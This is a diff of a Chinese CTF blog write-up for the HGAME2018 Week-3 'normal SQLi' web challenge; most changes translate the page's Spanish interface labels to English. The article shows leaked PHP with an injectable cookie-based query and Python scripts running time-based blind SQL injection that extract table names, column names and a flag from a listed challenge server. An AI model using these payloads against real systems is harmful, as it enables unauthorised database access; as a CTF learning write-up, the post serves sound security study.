@@ -7,22 +7,22 @@
   
   <title>HGAME2018 Week-3 Web Writeup | Klaus&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+  <meta name="description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
 <meta name="keywords" content="CTF_Web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HGAME2018 Week-3 Web Writeup">
 <meta property="og:url" content="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/index.html">
 <meta property="og:site_name" content="Klaus&#39;s Blog">
-<meta property="og:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+<meta property="og:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe59401e.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5b650f.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/03/03/5a9a9fe5be804.jpg">
-<meta property="og:updated_time" content="2018-03-03T13:17:09.586Z">
+<meta property="og:updated_time" content="2018-07-25T08:18:11.801Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HGAME2018 Week-3 Web Writeup">
-<meta name="twitter:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…12345678910111213141516&amp;lt;?php.....$username = base64_decode($_COOKIE[&apos;name&apos;]);.....$sql = &quot;select * from user where username = &apos;&amp;#123;$username&amp;#125;&apos;&quot;;$re =">
+<meta name="twitter:description" content="正常的SQLi打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…">
 <meta name="twitter:image" content="https://i.loli.net/2018/03/03/5a9a9fe584f9d.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Klaus&#39;s Blog" type="application/atom+xml">
@@ -63,9 +63,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -100,7 +100,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</span><br><span class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
+        <h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>打开以后说什么都没有…我猜是源码泄露，直接加上.bak就爆出源码了…</p>
+<a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</span><br><span class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
 <p>看起来觉得像是cookie注入，还需要进行base64加密，重新进入index.php抓包进行分析，先进性一次url解码然后再base64解码后发现是guest。<br>所以这里切换为admin，然后base64加密，YWRtaW4=，等号用%3d进行绕过测试，界面变成了hello admin，so…应该就是cookie注入,所以写脚本注入。<br>首先判断数据库的长度：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment">#test the length of database.</span></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	<span class="attribute">url</span>=<span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</span><br><span class="line">		<span class="attribute">r</span>=requests.session()</span><br><span class="line">		<span class="attribute">payload</span>=<span class="string">"admin' or if(length(database())="</span>+str(i)+",1,sleep(3))#"</span><br><span class="line">		cookie=&#123;<span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))&#125;</span><br><span class="line">		<span class="attribute">start_time</span>=time.time()</span><br><span class="line">		r.post(<span class="attribute">url</span>=url,cookies=cookie)</span><br><span class="line">		<span class="keyword">if</span> time.time()-start_time&lt;2:</span><br><span class="line">			<span class="builtin-name">print</span> <span class="string">"The length of database is "</span>,i</span><br><span class="line">			break</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attribute">__name__</span>=="__main__":</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
 <p>数据库长度为4，然后就是一系列的查找什么的…<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>willardtm.github.io<span class="regexp">/2018/</span><span class="number">02</span><span class="regexp">/19/</span>sqlilabs-Less-<span class="number">5</span>~<span class="number">6</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
 <p>但是我觉得这样做一道题感觉有些麻烦，我在想能不能减少一些步骤来提高效率，so我找到了一份大师傅的WP，对比一下我发现大师傅和我做的不一样的是大师傅没有直接跑出对应表/列的长度，而是定义了一个比较大的数字直接运行。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">url = <span class="string">"http://123.206.203.108:10010/normalSQLi/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((),%s,1))=%s),sleep(3),false)#"</span>%(i,j)  user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),false)#"</span>%(i,j) user</span><br><span class="line">        #payload = <span class="string">"admin' or if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        payload = <span class="string">"admin' or if((ascii(substr((select flag from user limit 2,1),%s,1))=%s),sleep(3),false)#"</span>%(i,j)</span><br><span class="line">        cookie = &#123;</span><br><span class="line">            <span class="string">"name"</span>:urllib.quote(base64.b64encode(payload))</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url,cookies=cookie,timeout=2.5)</span><br><span class="line">        except:</span><br><span class="line">            flag +=chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
@@ -126,7 +128,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/" data-id="cjk0t3ve4000d9cv41ahkzrti" class="article-share-link">Compartir</a>
+      <a data-url="http://yoursite.com/2018/03/03/HGAME2018-Week-3-Web-Writeup/" data-id="cjk0upek6000aokv4eazcummm" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li></ul>
@@ -138,7 +140,7 @@
 <nav id="article-nav">
   
     <a href="/2018/03/05/浅谈凸包算法/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Nuevo</strong>
+      <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
           浅谈凸包算法
@@ -148,7 +150,7 @@
   
   
     <a href="/2018/02/27/HGAME2018-Week-2-Writeup/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Viejo</strong>
+      <strong class="article-nav-caption">Older</strong>
       <div class="article-nav-title">HGAME2018 Week-2 Web Writeup</div>
     </a>
   
@@ -163,7 +165,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categorías</h3>
+    <h3 class="widget-title">Categories</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI-Learning/">AI_Learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Algorithm/">Algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTML/">HTML</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/XSS漏洞学习/">XSS漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li></ul>
     </div>
@@ -183,7 +185,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Nube de Tags</h3>
+    <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
       <a href="/tags/Algorithm/" style="font-size: 13.33px;">Algorithm</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF-Web/" style="font-size: 20px;">CTF_Web</a> <a href="/tags/HTML/" style="font-size: 10px;">HTML</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/NLP/" style="font-size: 10px;">NLP</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/SQL-injection/" style="font-size: 16.67px;">SQL_injection</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/凸包算法/" style="font-size: 10px;">凸包算法</a> <a href="/tags/大数据/" style="font-size: 10px;">大数据</a> <a href="/tags/微信小程序/" style="font-size: 10px;">微信小程序</a> <a href="/tags/杂谈/" style="font-size: 10px;">杂谈</a> <a href="/tags/环境配置/" style="font-size: 10px;">环境配置</a> <a href="/tags/算法考核/" style="font-size: 10px;">算法考核</a>
     </div>
@@ -192,7 +194,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archivos</h3>
+    <h3 class="widget-title">Archives</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
     </div>
@@ -202,7 +204,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Posts recientes</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
@@ -239,7 +241,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 Klaus<br>
-      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
